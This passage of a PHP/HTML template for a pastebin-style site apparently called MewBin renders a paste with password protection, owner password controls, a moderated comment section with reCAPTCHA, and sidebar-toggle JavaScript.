            margin: 0 auto 32px auto;
            padding: 24px;
            background: #1a0b2e;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(138, 43, 226, 0.3);
            border: 1px solid #8a2be2;
        }
        .milestone-section h3 {
            color: #d8b4fe;
            margin-bottom: 20px; /* Increased spacing */
            text-align: center;
            font-size: 1.4em; /* Increased size */
        }
        .milestone-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); /* Slightly larger */
            gap: 18px; /* Increased gap */
        }
        .milestone-item {
            background: rgba(45, 27, 105, 0.7);
            border-radius: 8px;
            padding: 18px; /* Increased padding */
            display: flex;
            align-items: center;
            transition: transform 0.2s;
            position: relative;
            border: 1px solid #8a2be2;
        }
        .milestone-item:hover {
            transform: translateY(-2px);
        }
        .milestone-icon {
            font-size: 2.8em; /* Slightly larger */
            margin-right: 14px; /* Increased spacing */
            flex-shrink: 0;
            color: #8a2be2;
        }
        .milestone-info {
            flex-grow: 1;
        }
        .milestone-name {
            font-size: 1.2em; /* Increased size */
            font-weight: bold;
            margin-bottom: 6px; /* Increased spacing */
            color: #fff;
        }
        .milestone-progress {
            font-size: 1.3em; /* Increased size */
            font-weight: bold;
            color: #8a2be2;
        }
        @media (max-width: 600px) {
            .milestone-section {
                padding: 20px; /* Increased padding */
            }
            .milestone-item {
                flex-direction: column;
                align-items: flex-start;
            }
            .milestone-icon {
                margin-bottom: 10px; /* Increased spacing */
            }
        }
    </style>
</head>
<body>
<?php
// Include the navbar after header-related logic to avoid 'headers already sent' issues
$navbarPath = __DIR__ . '/cstnavbar.php';
if (file_exists($navbarPath)) {
    include($navbarPath);
}
?>
<?php if ($show_password_prompt): ?>
    <div class="pw-prompt-box">
        <img src="https://files.catbox.moe/91w4zc.png" class="pw-prompt-logo" alt="Logo">
        <div class="pw-prompt-title">Enter password to view this paste</div>
        <?php if (!empty($password_error)): ?>
            <div class="pw-prompt-error"><?= htmlspecialchars($password_error) ?></div>
        <?php endif; ?>
        <form method="post" autocomplete="off">
            <input type="password" name="paste_password" class="pw-prompt-input" placeholder="Password" required autofocus>
            <button type="submit" class="pw-prompt-btn">Enter</button>
        </form>
    </div>
<?php else: ?>
    <div class="main-wrap sidebar-open" id="mainWrap">
        <div class="paste-content-area" id="pasteContentArea">
            <div class="logo-header">
                <img src="https://files.catbox.moe/91w4zc.png" alt="MewBin Logo">
                <span class="ascii-title"><?php echo htmlspecialchars($paste['title'], ENT_QUOTES, 'UTF-8'); ?></span>
            </div>
            <div class="ascii-content">
<?php
$content = htmlspecialchars($paste['content'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
$content = makeLinksClickable($content);
echo '<pre style="background:none;border:none;padding:0;margin:0;color:#fff;font-family:inherit;font-size:inherit;white-space:pre-wrap;word-break:break-word;line-height:1.5;">'
    . $content
    . '</pre>';
?>
            </div>
        </div>
        <div class="sidebar" id="sidebar">
            <img src="https://files.catbox.moe/91w4zc.png" class="sidebar-logo" alt="Logo">
            <div class="sidebar-title">
                <i class="fas fa-file-alt"></i> <?php echo htmlspecialchars($paste['title'], ENT_QUOTES, 'UTF-8'); ?>
            </div>
            <div class="sidebar-meta">
                <b>Created:</b> <?php echo htmlspecialchars($paste['date_created'], ENT_QUOTES, 'UTF-8'); ?>
            </div>
            <div class="sidebar-meta">
                <b>Author:</b>
                <a href="user/<?php echo urlencode($paste['creator']); ?>" target="_blank" style="color:#d8b4fe;">
                    <?php echo htmlspecialchars($paste['creator'], ENT_QUOTES, 'UTF-8'); ?>
                </a>
            </div>
            <div class="sidebar-meta">
                <b>Views:</b> <?php echo (int)$paste['views']; ?>
            </div>
            <div class="sidebar-meta">
                <b>Comments:</b>
                <?php echo htmlspecialchars($commentsDisplay, ENT_QUOTES, 'UTF-8'); ?>
            </div>
            <div class="votes">
                <i class="fas fa-thumbs-up"></i> <?php echo (int)($paste['upvotes'] ?? 0); ?>
                &nbsp;
                <i class="fas fa-thumbs-down"></i> <?php echo (int)($paste['downvotes'] ?? 0); ?>
            </div>
            <a href="upload" class="sidebar-btn">New (N)</a>
            <?php if ($isOwner): ?>
                <a href="edit.php?title=<?php echo urlencode($paste['title']); ?>" class="sidebar-btn" style="background:#2d1b69;">Edit Paste</a>
            <?php endif; ?>
            <a href="posted/<?php echo urlencode($paste['title']); ?>&raw=1" class="sidebar-btn" target="_blank">Raw (R)</a>
            <div class="sidebar-comments" style="width:100%;margin:24px 0 0 0;">
                <h4 style="color:#d8b4fe;margin-bottom:16px;">Comments</h4>
                <?php if ($canOwnerManage): ?>
                    <form method="post" style="margin-bottom:16px;">
                        <button type="submit" name="toggle_comments" class="sidebar-btn" style="width:auto;background:#2d1b69;">
                            <?php echo $commentsEnabled ? 'Disable Comments' : 'Enable Comments'; ?>
                        </button>
                    </form>
                    <form method="post" style="margin-bottom:16px;">
                        <div style="margin-bottom:10px;font-weight:bold;color:#d8b4fe;">Paste Password</div>
                        <?php if (!empty($paste['password_enabled']) && $paste['password_enabled'] == 1): ?>
                            <div style="margin-bottom:10px;">
                                <span style="color:#d8b4fe;">Password is enabled</span>
                            </div>
                            <input type="password" name="new_paste_password" class="pw-prompt-input" placeholder="Change password (leave blank to keep)">
                            <button type="submit" name="change_paste_password" class="sidebar-btn" style="background:#8a2be2;margin-bottom:8px;">Change Password</button>
                            <button type="submit" name="disable_paste_password" class="sidebar-btn" style="background:#e74c3c;">Disable Password</button>
                        <?php else: ?>
                            <input type="password" name="new_paste_password" class="pw-prompt-input" placeholder="Set password">
                            <button type="submit" name="enable_paste_password" class="sidebar-btn" style="background:#8a2be2;">Enable Password</button>
                        <?php endif; ?>
                    </form>
                    <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $canOwnerManage) {
                        if (isset($_POST['enable_paste_password']) && !empty($_POST['new_paste_password'])) {
                            $new_hash = password_hash($_POST['new_paste_password'], PASSWORD_DEFAULT);
                            $stmt = $conn->prepare("UPDATE pastes SET password = ?, password_enabled = 1 WHERE id = ?");
                            $stmt->bind_param("si", $new_hash, $pasteId);
                            $stmt->execute();
                            $stmt->close();
                            header("Location: posted/" . urlencode($paste['title']));
                            exit;
                        }
                        if (isset($_POST['disable_paste_password'])) {
                            $stmt = $conn->prepare("UPDATE pastes SET password = NULL, password_enabled = 0 WHERE id = ?");
                            $stmt->bind_param("i", $pasteId);
                            $stmt->execute();
                            $stmt->close();
                            header("Location: posted/" . urlencode($paste['title']));
                            exit;
                        }
                        if (isset($_POST['change_paste_password'])) {
                            $new_pw = trim($_POST['new_paste_password']);
                            if (!empty($new_pw)) {
                                $new_hash = password_hash($new_pw, PASSWORD_DEFAULT);
                                $stmt = $conn->prepare("UPDATE pastes SET password = ?, password_enabled = 1 WHERE id = ?");
                                $stmt->bind_param("si", $new_hash, $pasteId);
                                $stmt->execute();
                                $stmt->close();
                                header("Location: posted/" . urlencode($paste['title']));
                                exit;
                            }
                        }
                    }
                    ?>
                <?php elseif ($isOwner): ?>
                    <div style="color:#ff6b6b;font-weight:bold;"></div>
                <?php endif; ?>

                <?php
                $canDelete = false;
                $deleteRanks = ['Admin', 'Manager', 'Mod', 'Council'];
                $currentRank = null;
                if (isset($_SESSION['username'])) {
                    $stmt = $conn->prepare("SELECT rank FROM users WHERE username = ?");
                    if ($stmt) {
                        $stmt->bind_param("s", $_SESSION['username']);
                        $stmt->execute();
                        $stmt->bind_result($currentRank);
                        $stmt->fetch();
                        $stmt->close();
                        if (in_array($currentRank, $deleteRanks)) $canDelete = true;
                    }
                }
                $stmt = $conn->prepare("SELECT c.*, u.rank, u.color as user_color, u.has_color FROM paste_comments c LEFT JOIN users u ON c.commentor = u.username WHERE c.paste_id = ? ORDER BY c.created_at DESC");
                if ($stmt) {
                    $stmt->bind_param("i", $pasteId);
                    $stmt->execute();
                    $commentsResult = $stmt->get_result();
                    if ($commentsResult && $commentsResult->num_rows === 0) {
                        echo '<div style="color:#a78bfa;">No comments yet.</div>';
                    } elseif ($commentsResult) {
                        while ($comment = $commentsResult->fetch_assoc()) {
                            $rank = $comment['rank'] ?? 'All Users';
                            $rankTag = isset($rankData[$rank]) && !empty($rankData[$rank]['tag']) ? $rankData[$rank]['tag'] : '';
                            $rankColor = isset($rankData[$rank]) && !empty($rankData[$rank]['color']) ? $rankData[$rank]['color'] : '#fff';
                            $rankGif = isset($rankData[$rank]) && !empty($rankData[$rank]['gif']) ? $rankData[$rank]['gif'] : '';
                            $usernameColor = $rankColor;
                            if ($comment['has_color'] == 1 && !empty($comment['user_color'])) {
                                $usernameColor = htmlspecialchars($comment['user_color'], ENT_QUOTES, 'UTF-8');
                            }

                            $username = htmlspecialchars($comment['commentor'], ENT_QUOTES, 'UTF-8');
                            $content = htmlspecialchars($comment['comment'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
                            $createdAt = htmlspecialchars($comment['created_at'], ENT_QUOTES, 'UTF-8');
                            $commentId = (int)($comment['id'] ?? 0);
                            $inlineStyle = 'color:' . $usernameColor . ';';
                            if ($rankGif) $inlineStyle .= "background-image: url('" . htmlspecialchars($rankGif, ENT_QUOTES, 'UTF-8') . "');";
                            $inlineStyle .= 'background-size: 20px 20px; background-repeat: no-repeat; margin-left:0; padding-left:0; min-width:0; display:inline-block;';
                            ?>
                            <div class="comment-box" id="comment-box-<?php echo $commentId; ?>">
                                <div class="comment-header">
                                    <span class="comment-username-rank" style="margin-left:0;">
                                        <span class="comment-username" style="<?php echo $inlineStyle; ?>">
                                            <?php echo $username; ?>
                                        </span>
                                        <?php if ($rankTag):?>
                                            <span class="comment-rank" style="color:<?php echo $rankColor; ?>;"><?php echo $rankTag; ?></span>
                                        <?php endif; ?>
                                    </span>
                                    <span class="comment-time"><?php echo timeAgo($createdAt); ?></span>
                                    <?php if ($canDelete): ?>
                                        <form method="post" class="delete-comment-form" style="display:inline;margin-left:10px;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                            <input type="hidden" name="delete_comment_id" value="<?php echo $commentId; ?>">
                                            <button type="submit" class="comment-delete-btn" onclick="return deleteComment(this, <?php echo $commentId; ?>);">Delete</button>
                                        </form>
                                    <?php endif; ?>
                                </div>
                                <div class="comment-content"><?php echo nl2br($content); ?></div>
                            </div>
                            <?php
                        }
                    }
                }
                ?>
                <?php if (isset($commentError)): ?>
                    <div style="color:#ff6b6b;font-weight:bold;"><?php echo htmlspecialchars($commentError, ENT_QUOTES, 'UTF-8'); ?></div>
                <?php endif; ?>

                <?php if ($commentsEnabled): ?>
                    <form method="post" style="margin-top:16px;">
                        <input type="hidden" name="paste_id" value="<?php echo $pasteId; ?>">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <label style="color:#d8b4fe;">
                            Commenting as:
                            <strong>
                                <?php echo ($currentUser) ? htmlspecialchars($currentUser, ENT_QUOTES, 'UTF-8') : 'Anonymous'; ?>
                            </strong>
                        </label>
                        <textarea name="content" rows="3" style="width:100%;background:#2d1b69;color:#fff;border:1px solid #8a2be2;border-radius:5px;padding:10px;font-size:1.1em;" placeholder="Add a comment..." maxlength="240" required></textarea>
                        <button type="submit" class="sidebar-btn" style="width:100%;margin-top:12px;">Post</button>
                        <div class="g-recaptcha" data-sitekey="6Leb_DgrAAAAAIPrPYN-fbtTkBmLzJ5-Ak7FeHpr" style="margin:16px auto 0 auto;max-width:220px;min-width:180px;display:flex;justify-content:center;"></div>
                    </form>
                <?php else: ?>
                    <div style="color:#a78bfa;font-weight:bold;margin-top:16px;">Comments are disabled for this paste.</div>
                <?php endif; ?>
            </div>
            <div class="sidebar-note" style="margin-top:24px;">
                Please note that all posted information is publicly available and must follow our TOS.
            </div>
        </div>
        <button class="sidebar-toggle-btn" id="sidebarToggleBtn" title="Toggle sidebar">
            <span id="sidebarToggleIcon">&gt;</span>
        </button>
    </div>
<?php endif; ?>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0/css/all.min.css">
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script>
    function setMobileViewport() {
        const viewport = document.querySelector('meta[name=viewport]');
        if (viewport) {
            viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
        }
        const vh = window.innerHeight * 0.01;
        document.documentElement.style.setProperty('--vh', `${vh}px`);
    }

    if (window.innerWidth <= 768) {
        setMobileViewport();
    }

    const sidebar = document.getElementById('sidebar');
    const toggleBtn = document.getElementById('sidebarToggleBtn');
    const mainWrap = document.getElementById('mainWrap');
    const icon = document.getElementById('sidebarToggleIcon');

    if (sidebar && toggleBtn && mainWrap && icon) {
        let sidebarOpen = false; 
        
        if (window.innerWidth > 1100) {
            sidebarOpen = true;
        }
        
        function updateSidebar() {
            if (sidebarOpen) {
                sidebar.classList.remove('closed');
                if (window.innerWidth > 1100) {
                    mainWrap.classList.add('sidebar-open');
                }
                icon.innerHTML = '&gt;';
            } else {
                sidebar.classList.add('closed');
                mainWrap.classList.remove('sidebar-open');
                icon.innerHTML = '&lt;';
            }
        }
        
        toggleBtn.addEventListener('click', function() {
            sidebarOpen = !sidebarOpen;
            updateSidebar();
        });
        
        window.addEventListener('resize', function() {
            if (window.innerWidth <= 768) {
                setMobileViewport();
            }
            
            if (window.innerWidth > 1100 && !sidebarOpen) {
                sidebarOpen = true;
                updateSidebar();
            } else if (window.innerWidth <= 1100 && sidebarOpen) {
                updateSidebar();
            }
        });
        window.addEventListener('orientationchange', function() {
            setTimeout(function() {
                if (window.innerWidth <= 768) {
                    setMobileViewport();
                }
            }, 100);
        });
        
        updateSidebar();
    }

    function deleteComment(btn, commentId) {
        if (!confirm('Delete this comment?')) return false;
        var form = btn.closest('form');
        var data = new FormData(form);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '', true);
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.onload = function() {
            if (xhr.status === 200 && xhr.responseText.trim() === 'success') {
                var box = document.getElementById('comment-box-' + commentId);
                if (box) box.remove();
            } else {
                alert('Failed to delete comment.');
            }
        };
        xhr.send(data);
        return false;
    }
    document.addEventListener('DOMContentLoaded', function() {
        document.body.style.opacity = '1';
        document.body.style.visibility = 'visible';
    });
</script>
</body>
</html>